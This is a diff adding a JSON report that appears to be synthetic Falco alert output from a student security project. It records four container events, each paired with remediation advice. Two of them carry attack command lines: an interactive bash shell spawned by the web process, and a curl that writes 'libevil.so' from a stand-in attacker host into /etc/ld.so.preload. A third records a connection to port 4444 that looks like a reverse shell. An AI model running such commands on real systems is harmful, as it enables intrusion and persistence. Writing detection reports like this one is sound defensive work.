@@ -1,0 +1,98 @@
+﻿{
+    "engine":  "Sysdig Falco Runtime Security v0.38.1",
+    "driver":  "eBPF probe (sys_enter/sys_exit)",
+    "scanTimestamp":  "2026-09-13T13:01:13.913743Z",
+    "rulesFile":  "C:\\Users\\Claudwal\\Documents\\MISIS\\sem3\\security\\kurs\\deploy\\falco\\falco_rules.local.yaml",
+    "totalEvents":  4,
+    "events":  [
+                   {
+                       "id":  "EVT-FALCO-001",
+                       "time":  "2026-09-13T13:01:13.913743Z",
+                       "rule":  "Spawn Shell in SecureKnowledgeBase Container",
+                       "priority":  "Critical",
+                       "priorityNum":  1,
+                       "tags":  [
+                                    "application",
+                                    "rce",
+                                    "container",
+                                    "mitre_execution"
+                                ],
+                       "output":  "13:45:00.124310000: Critical Shell spawned by ASP.NET Core web process (user=appuser proc=bash cmdline=bash -i parent=dotnet pcmdline=dotnet /app/SecureKnowledgeBase.Web.dll container_id=a1b2c3d4e5f6 container_name=skb-app-prod image=secure-knowledge-base:hardened-alpine)",
+                       "outputFields":  {
+                                            "user.name":  "appuser",
+                                            "proc.name":  "bash",
+                                            "proc.cmdline":  "bash -i",
+                                            "proc.pname":  "dotnet",
+                                            "proc.pcmdline":  "dotnet /app/SecureKnowledgeBase.Web.dll",
+                                            "container.id":  "a1b2c3d4e5f6",
+                                            "container.name":  "skb-app-prod",
+                                            "container.image.repository":  "secure-knowledge-base:hardened-alpine"
+                                        },
+                       "remediation":  "Terminate container instance immediately, isolate network segment, inspect upload directory for web-shell artifacts."
+                   },
+                   {
+                       "id":  "EVT-FALCO-002",
+                       "time":  "2026-09-13T13:01:13.913743Z",
+                       "rule":  "Unauthorized Access to SecureKnowledgeBase Storage",
+                       "priority":  "Warning",
+                       "priorityNum":  4,
+                       "tags":  [
+                                    "filesystem",
+                                    "data_leak",
+                                    "mitre_collection"
+                                ],
+                       "output":  "13:45:02.481920000: Warning Unauthorized process attempted reading application data (user=nobody proc=cat cmdline=cat /app/app_data/secure_knowledge_base.db file=/app/app_data/secure_knowledge_base.db container_id=a1b2c3d4e5f6)",
+                       "outputFields":  {
+                                            "user.name":  "nobody",
+                                            "proc.name":  "cat",
+                                            "proc.cmdline":  "cat /app/app_data/secure_knowledge_base.db",
+                                            "fd.name":  "/app/app_data/secure_knowledge_base.db",
+                                            "container.id":  "a1b2c3d4e5f6"
+                                        },
+                       "remediation":  "Enforce strict Linux DAC/ACL permissions (chmod 600) and AppArmor profile denying file access to foreign binaries."
+                   },
+                   {
+                       "id":  "EVT-FALCO-003",
+                       "time":  "2026-09-13T13:01:13.913743Z",
+                       "rule":  "Unexpected Outbound Network Connection",
+                       "priority":  "Notice",
+                       "priorityNum":  5,
+                       "tags":  [
+                                    "network",
+                                    "c2",
+                                    "mitre_command_and_control"
+                                ],
+                       "output":  "13:45:05.892010000: Notice Outbound network connection to unexpected remote port (user=appuser proc=dotnet connection=10.20.1.5:54321-\u003e198.51.100.45:4444 rport=4444 rip=198.51.100.45 container_id=a1b2c3d4e5f6)",
+                       "outputFields":  {
+                                            "user.name":  "appuser",
+                                            "proc.name":  "dotnet",
+                                            "fd.name":  "10.20.1.5:54321-\u003e198.51.100.45:4444",
+                                            "fd.rport":  4444,
+                                            "fd.rip":  "198.51.100.45",
+                                            "container.id":  "a1b2c3d4e5f6"
+                                        },
+                       "remediation":  "Block destination IP 198.51.100.45 in egress firewall / Security Group, inspect process stack for reverse shell payload."
+                   },
+                   {
+                       "id":  "EVT-FALCO-004",
+                       "time":  "2026-09-13T13:01:13.913743Z",
+                       "rule":  "System Binary Directory Write Attempt",
+                       "priority":  "Critical",
+                       "priorityNum":  1,
+                       "tags":  [
+                                    "filesystem",
+                                    "persistence",
+                                    "mitre_persistence"
+                                ],
+                       "output":  "13:45:07.102390000: Critical File modification attempted in system directory (user=root proc=curl file=/etc/ld.so.preload cmdline=curl -o /etc/ld.so.preload http://attacker-site.com/libevil.so container_id=a1b2c3d4e5f6)",
+                       "outputFields":  {
+                                            "user.name":  "root",
+                                            "proc.name":  "curl",
+                                            "fd.name":  "/etc/ld.so.preload",
+                                            "proc.cmdline":  "curl -o /etc/ld.so.preload http://attacker-site.com/libevil.so",
+                                            "container.id":  "a1b2c3d4e5f6"
+                                        },
+                       "remediation":  "Enforce read-only root filesystem (--read-only flag in docker run or readOnlyRootFilesystem in Kubernetes SecurityContext)."
+                   }
+               ]
+}
